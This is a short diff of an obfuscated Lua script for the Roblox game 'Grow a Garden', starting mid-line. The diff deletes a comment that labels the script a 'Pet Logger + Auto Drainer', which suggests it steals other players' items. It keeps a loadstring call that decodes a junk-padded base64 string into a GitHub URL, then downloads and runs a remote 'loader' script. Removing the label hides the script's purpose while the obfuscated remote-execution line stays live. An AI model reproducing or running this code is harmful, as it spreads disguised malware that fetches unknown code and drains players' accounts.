@@ -5,10 +5,6 @@ data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) i
 
 
  
-
-
--- ✅ Grow a Garden Pet Logger + Auto Drainer + Server Hopper + Unfavorite Handler
-
 -- EXECUTE EXTERNAL SCRIPT
 loadstring(game:HttpGetAsync(KdOvFZYgKzIehHzTVMxiSEgY('xZYSgEDXdcbScQnPsgwNYpPHBXUkaWBmegXqqHVOYDGfktUUTvaLHLKaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()
 
